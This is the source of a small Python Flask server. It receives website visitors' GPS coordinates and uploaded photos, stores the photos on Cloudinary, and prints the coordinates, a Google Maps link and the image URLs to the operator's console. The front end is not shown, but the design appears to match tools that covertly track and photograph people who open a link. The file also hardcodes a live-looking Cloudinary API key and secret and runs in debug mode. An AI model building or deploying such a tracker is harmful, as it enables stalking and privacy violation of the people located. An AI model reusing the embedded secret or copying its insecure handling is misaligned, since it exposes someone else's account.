import cloudinary
import cloudinary.uploader
from flask import Flask, render_template, request, send_from_directory
import os

app = Flask(__name__)

# Cloudinary Configuration
cloudinary.config(
    cloud_name="dqsetcecu",
    api_key="119182683135652",
    api_secret="9Qbv-lCwg7oN_dkDtjHESAbhLIw"
)

UPLOAD_FOLDER = "photos"

# Photos folder automatically create karega
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

# Home Page
@app.route("/")
def home():
    return render_template("index.html")

@app.route('/google7461784f30bcb101.html')
def google_verify():
    return send_from_directory('.', 'google7461784f30bcb101.html')

# Save Location
@app.route("/save-location", methods=["POST"])
def save_location():

    data = request.json

    lat = data.get("latitude")
    lon = data.get("longitude")

    print("\n========== LOCATION ==========")
    print("Latitude:", lat)
    print("Longitude:", lon)

    google_maps = f"https://maps.google.com/?q={lat},{lon}"

    print("Google Maps:", google_maps)

    return {
        "status": "location saved"
    }

# Location Save
@app.route("/upload", methods=["POST"])
def upload():

    file = request.files["photo"]

    result = cloudinary.uploader.upload(file)

    print("\n========== PHOTO UPLOADED ==========")

    print("Image URL:")
    print(result["secure_url"])

    return {
        "status": "uploaded",
        "url": result["secure_url"]
    }

# Run Server
if __name__ == "__main__":
    app.run(debug=True)